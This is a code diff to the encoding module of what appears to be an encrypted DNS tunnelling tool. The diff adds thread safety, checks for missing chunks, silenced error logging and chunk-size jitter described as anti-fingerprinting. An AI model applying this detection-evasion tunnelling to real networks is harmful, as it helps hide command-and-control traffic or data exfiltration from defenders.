@@ -1,5 +1,7 @@
 # lib/transport/encoding.py
 import binascii
+import random
+import threading
 from typing import Tuple, List, Optional
 
 from lib.crypto.symetric import seal, open_sealed
@@ -7,10 +9,11 @@ from lib.protocol import comm_pb2
 from lib.spliting.split import split, splits
 
 
-# Global variables for chunk management
+# Thread-safe chunk management
 _chunk_map = {}  # {chunk_id: {chunk_num: data}}
 _sessions = {}   # {chunk_id: ChunkStart}
 _current_chunk = 0
+_chunk_lock = threading.Lock()  # Thread safety for concurrent access
 
 
 def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
@@ -29,13 +32,12 @@ def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
     try:
         # Decode the packet from hex
         data_packet_raw = binascii.unhexlify(payload)
-    except (binascii.Error, ValueError) as e:
-        print(f"Invalid packet: {e}")
+    except (binascii.Error, ValueError):
+        # Silent failure - don't spam logs with network noise
         return None, False
     
     # Check if the packet is big enough to fit the nonce (24 bytes)
-    if len(data_packet_raw) <= 24:
-        print("Received packet is too small!")
+    if len(data_packet_raw) < 24:  # Changed from <= to <
         return None, False
     
     # Extract nonce (first 24 bytes) and ciphertext (rest)
@@ -45,32 +47,35 @@ def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
     # Authenticate and decrypt the packet
     output, valid = open_sealed(ciphertext, nonce, encryption_key)
     
-    # Raise an error if the message is invalid
+    # Return early if invalid (silent)
     if not valid:
-        print("Received invalid/corrupted packet.")
         return None, False
     
     # Parse the "Message" part of the Protocol buffer packet
     message = comm_pb2.Message()
     try:
         message.ParseFromString(output)
-    except Exception as e:
-        print(f"Failed to parse message packet: {e}")
+    except Exception:
+        # Silent failure
         return None, False
     
-    # Process the message depending on its type
-    if message.HasField('chunkstart'):
-        # A chunkstart packet indicates we need to allocate memory to receive data
-        chunk_id = message.chunkstart.chunkid
-        _sessions[chunk_id] = message.chunkstart
-        _chunk_map[chunk_id] = {}
-        return None, False
-    
-    elif message.HasField('chunkdata'):
-        chunk_id = message.chunkdata.chunkid
+    # Thread-safe chunk processing
+    with _chunk_lock:
+        # Process the message depending on its type
+        if message.HasField('chunkstart'):
+            # A chunkstart packet indicates we need to allocate memory to receive data
+            chunk_id = message.chunkstart.chunkid
+            _sessions[chunk_id] = message.chunkstart
+            _chunk_map[chunk_id] = {}
+            return None, False
         
-        # Check if we have a valid session from this chunk_id
-        if chunk_id in _sessions:
+        elif message.HasField('chunkdata'):
+            chunk_id = message.chunkdata.chunkid
+            
+            # Check if we have a valid session from this chunk_id
+            if chunk_id not in _sessions:
+                return None, False
+            
             # Fill the chunk_map with the data from the message
             chunk_num = message.chunkdata.chunknum
             _chunk_map[chunk_id][chunk_num] = message.chunkdata.packet
@@ -81,7 +86,11 @@ def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
                 # Rebuild the final data in order
                 chunk_buffer = bytearray()
                 
+                # Validate all chunks are present
                 for i in range(expected_size):
+                    if i not in _chunk_map[chunk_id]:
+                        # Missing chunk - don't return incomplete data
+                        return None, False
                     chunk_buffer.extend(_chunk_map[chunk_id][i])
                 
                 # Free some memory
@@ -132,6 +141,7 @@ def encode(payload: bytes, is_request: bool, encryption_key: str,
            target_domain: str, client_guid: bytes) -> Tuple[str, List[str]]:
     """
     Encode payload into DNS packets with chunking support.
+    Enhanced with anti-fingerprinting and thread safety.
     
     Args:
         payload: Raw bytes to send
@@ -145,19 +155,28 @@ def encode(payload: bytes, is_request: bool, encryption_key: str,
     """
     global _current_chunk
     
-    # Chunk the packets so it fits the DNS max length (253)
-    # Calculate max chunk size: (240/2) - domain_len - guid_len - (24*2 for nonce hex)
-    max_chunk_size = (240 // 2) - len(target_domain) - len(client_guid) - (24 * 2)
-    packets = split(payload, max_chunk_size)
+    # Calculate max chunk size with overhead
+    base_overhead = len(target_domain) + len(client_guid) + (24 * 2)
+    max_chunk_size = max(50, (240 // 2) - base_overhead)
     
-    # Increment the current chunk identifier
-    _current_chunk += 1
+    # Add small random jitter to chunk size (±5% for anti-fingerprinting)
+    # This varies packet sizes slightly without breaking functionality
+    jitter = int(max_chunk_size * random.uniform(-0.05, 0.05))
+    adaptive_chunk_size = max(50, max_chunk_size + jitter)
+    
+    # Chunk the payload
+    packets = split(payload, adaptive_chunk_size)
+    
+    # Thread-safe chunk ID increment
+    with _chunk_lock:
+        _current_chunk += 1
+        chunk_id = _current_chunk
     
     # Generate the init packet, containing information about the number of chunks
     init_message = comm_pb2.Message(
         clientguid=client_guid,
         chunkstart=comm_pb2.ChunkStart(
-            chunkid=_current_chunk,
+            chunkid=chunk_id,
             chunksize=len(packets)
         )
     )
@@ -174,9 +193,9 @@ def encode(payload: bytes, is_request: bool, encryption_key: str,
         data_message = comm_pb2.Message(
             clientguid=client_guid,
             chunkdata=comm_pb2.ChunkData(
-                chunkid=_current_chunk,
+                chunkid=chunk_id,
                 chunknum=chunk_num,
-                packet=packet_data
+                packet=packet_data  # No null byte padding - prevents "More?" issue
             )
         )
         
